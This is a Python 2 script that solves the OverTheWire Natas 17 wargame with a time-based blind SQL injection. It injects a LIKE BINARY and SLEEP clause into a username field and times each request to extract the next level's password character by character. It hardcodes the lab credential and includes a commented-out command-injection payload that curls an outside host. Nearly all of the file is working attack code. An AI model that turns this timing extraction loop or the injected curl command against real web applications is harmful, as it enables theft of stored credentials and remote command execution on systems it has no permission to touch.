import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
user = 'natas17'
url  = 'natas17.natas.labs.overthewire.org'

payload = {'username':''}

chars = lowercase + uppercase + digits
# payload = {'username':'$(curl http://verfriemelt.org)'}


# print re.search('([a-z]+)','12 hallo was geht ')

# sys.exit('quiut')

password = list();

test_times = list();

print 'timing requests'

for i in range(1,11):

    payload = {'username':'natas18'}

    time_start = datetime.datetime.now();
    req = requests.post('http://' + user +':'+ key +"@"+ url, payload)
    time_end = datetime.datetime.now();

    c = time_end - time_start
    s = c.total_seconds()
    test_times.append(s)
    print '#' + `i`, s

std_time = reduce(lambda x, y: x + y, test_times) / len(test_times)

print 'usual request time:', std_time

selected_time = std_time * 5
print selected_time

while len(password) < 32:
    for c in chars:

        # payload.update({'username': 'natas18" AND password LIKE BINARY "' + "".join(password) + c + '%" AND SLEEP(1) --'})
        payload.update({'username': 'natas18" AND password LIKE BINARY "' + "".join(password) + c + '%" AND SLEEP('+ `selected_time` +') AND "a" = "a'})


        time_start = datetime.datetime.now()
        req = requests.post('http://' + user +':'+ key +"@"+ url + '?debug', payload)
        time_end = datetime.datetime.now()

        tdiff =  time_end - time_start

        # print req.request.body
        # print req.text

        s =  tdiff.total_seconds() 
        print ''.join(password), c, s

        if ( s > selected_time ):
            password.append(c)
            break

print "".join(password)
# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
